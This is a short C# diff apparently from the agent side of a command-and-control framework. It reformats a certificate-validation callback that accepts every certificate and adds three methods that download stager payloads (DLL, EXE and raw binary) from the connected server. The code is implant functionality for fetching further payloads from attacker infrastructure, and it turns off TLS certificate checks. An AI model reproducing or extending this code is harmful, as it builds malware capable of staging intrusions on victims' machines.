@@ -15,7 +15,7 @@ namespace Agent.Models
     {
         public string ConnectAddress { get; set; }
         public int ConnectPort { get; set; }
-        
+
         public string Protocol { get; set; }
 
         private CancellationTokenSource _tokenSource;
@@ -33,8 +33,10 @@ namespace Agent.Models
             ServicePointManager.ServerCertificateValidationCallback = new
             RemoteCertificateValidationCallback
             (
-               delegate { 
-                   return true; }
+               delegate
+               {
+                   return true;
+               }
             );
         }
 
@@ -234,5 +236,23 @@ namespace Agent.Models
             return desc.Id;
         }
 
+        public override async Task<Byte[]> DownloadStagerDll()
+        {
+            var response = await _client.GetAsync("/StagerDll");
+            var responseContent = await response.Content.ReadAsByteArrayAsync();
+            return responseContent;
+        }
+        public override async Task<Byte[]> DownloadStagerExe()
+        {
+            var response = await _client.GetAsync("/StagerExe");
+            var responseContent = await response.Content.ReadAsByteArrayAsync();
+            return responseContent;
+        }
+        public override async Task<Byte[]> DownloadStagerBin()
+        {
+            var response = await _client.GetAsync("/StagerBin");
+            var responseContent = await response.Content.ReadAsByteArrayAsync();
+            return responseContent;
+        }
     }
 }
